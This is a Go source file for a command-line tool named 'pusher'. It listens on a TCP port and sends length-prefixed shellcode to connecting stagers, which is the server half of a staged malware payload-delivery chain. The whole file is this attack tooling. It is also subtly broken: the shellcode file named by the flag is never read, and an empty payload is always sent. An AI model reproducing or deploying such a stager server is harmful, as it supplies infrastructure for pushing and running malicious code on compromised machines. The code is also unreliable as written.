package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"

	"github.com/spf13/cobra"
)

var opts struct {
	address  string
	net      string
	fileName string
}

var pusher = &cobra.Command{
	Use:   "pusher",
	Short: "pusher pushes shellcode to a stager",
	Run:   runPusherServer,
}

func init() {
	pusher.PersistentFlags().StringVarP(&opts.address, "address", "a", ":5555", "listen address ([ip]:port)")
	pusher.MarkPersistentFlagRequired("address")
	pusher.PersistentFlags().StringVarP(&opts.net, "net", "n", "tcp", "dial network")
	pusher.PersistentFlags().StringVarP(&opts.fileName, "shellcode", "s", "", "file containing the shellcode")
	pusher.MarkPersistentFlagRequired("shellcode")
}

func runPusherServer(cmd *cobra.Command, args []string) {
	ln, err := net.Listen(opts.net, opts.address)
	if err != nil {
		log.Fatalf("Listen failed: %v\n", err)
	}
	log.Printf("Listening on %s/%s\n", opts.address, opts.net)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Could not establish connection: %v", err)
			continue
		}
		go serveShellcode(conn, []byte{})
	}
}

func serveShellcode(conn net.Conn, shellcode []byte) {
	defer conn.Close()
	log.Printf("Serving shellcode to %s", conn.RemoteAddr())
	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(shellcode)))
	_, err := conn.Write(size)
	if err != nil {
		log.Fatalf("Error anouncing shellcode size: %v", err)
	}
	_, err = conn.Write(shellcode)
	if err != nil {
		log.Fatalf("Error sending shellcode: %v", err)
	}
}

func main() {
	if err := pusher.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
